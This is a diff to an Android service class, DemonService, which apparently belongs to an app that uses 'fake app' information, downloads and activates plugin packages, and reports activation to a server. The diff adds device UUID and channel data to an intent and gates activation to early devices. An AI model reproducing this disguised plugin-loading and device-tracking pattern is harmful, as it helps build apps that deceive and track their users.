@@ -36,7 +36,7 @@ import java.util.HashMap;
  */
 public class DemonService extends IntentService {
 
-    public static final String ACTION_ACTIVE_SERVICE = "com.xdtd.service.active";
+    public static final String ACTION_ACTIVE_PLUGIN = "com.xdtd.service.active";
 
     public static final String ACTION_DOWNLOAD_PLUGIN = "com.xstd.service.download";
 
@@ -44,7 +44,7 @@ public class DemonService extends IntentService {
 
     public static final String ACTION_PLUGIN_INSTALL = "com.xstd.qs.plugin.installed";
 
-    public static final String ACTION_ACTIVE_MAIN = "com.xstd.qs.active";
+    public static final String ACTION_ACTIVE_MAIN_FOR_FAKE = "com.xstd.qs.active";
 
     public DemonService() {
         super("DemonService");
@@ -62,12 +62,12 @@ public class DemonService extends IntentService {
                 notifyPluginInstalled();
             } else if (ACTION_LANUCH.equals(action)) {
                 lanuchQS();
-            } else if (ACTION_ACTIVE_MAIN.equals(action)) {
+            } else if (ACTION_ACTIVE_MAIN_FOR_FAKE.equals(action)) {
                 //通知服务器激活
                 if (SettingManager.getInstance().getKeyLanuchTime() != 0) {
                     activeQS();
                 }
-            } else if (ACTION_ACTIVE_SERVICE.equals(action)) {
+            } else if (ACTION_ACTIVE_PLUGIN.equals(action)) {
                 //尝试激活子程序
                 if (Config.DEBUG) {
                     Config.LOGD("[[DemonService::onHandleIntent]] try to active <<plugin>> package after 3S");
@@ -92,6 +92,13 @@ public class DemonService extends IntentService {
                 if (!TextUtils.isEmpty(AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae)) {
                     i.putExtra("packageName", AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae);
                 }
+                String uuid = SettingManager.uuid != null ? SettingManager.uuid.toString() : null;
+                if (!TextUtils.isEmpty(uuid)) {
+                    i.putExtra("uuid", uuid);
+                }
+                i.putExtra("extra", SettingManager.getInstance().getExtraInfo());
+                i.putExtra("channel", Config.CHANNEL_CODE);
+
                 startService(i);
 
                 if (SettingManager.getInstance().getLoopActiveCount() < 10) {
@@ -165,11 +172,6 @@ public class DemonService extends IntentService {
                     Config.LOGD("[[DemonService::notifyPluginInstalled]] success notify service Plugin Installed ::::::::");
                 }
                 SettingManager.getInstance().setNotifyPluginInstallSuccess(true);
-
-                Intent i = new Intent();
-                i.setClass(getApplicationContext(), DemonService.class);
-                i.setAction(DemonService.ACTION_ACTIVE_MAIN);
-                startService(i);
 
                 return;
             } else {
@@ -321,7 +323,10 @@ public class DemonService extends IntentService {
                 }
 
 //                                UtilOperator.startActiveAlarm(getApplicationContext(), 30 * 60 * 1000);
-                startAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN, SettingManager.getInstance().getRealActiveDelayTime());
+                if (SettingManager.getInstance().getDisableDownloadPlugin()) {
+                    //如果是前几个设备的话，就立刻激活
+                    startAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN_FOR_FAKE, SettingManager.getInstance().getRealActiveDelayTime());
+                }
                 cancelAlarmForAction(getApplicationContext(), ACTION_LANUCH);
 
                 return;
@@ -354,8 +359,7 @@ public class DemonService extends IntentService {
         CustomThreadPool.asyncWork(new Runnable() {
             @Override
             public void run() {
-//                UtilOperator.cancelActiveAlarm(getApplicationContext());
-                cancelAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN);
+//                cancelAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN);
                 try {
                     //每次激活都会获取
                     Utils.tryToFetchAdapterInfo(getApplicationContext());
@@ -417,13 +421,13 @@ public class DemonService extends IntentService {
                         }
                         //激活成功
                         SettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
-                        cancelAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN);
+//                        cancelAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN);
                         return;
                     }
                 } catch (Exception e) {
                 }
 
-                startAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN, ((long) 30) * 60 * 1000);
+//                startAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN, ((long) 30) * 60 * 1000);
             }
         });
     }
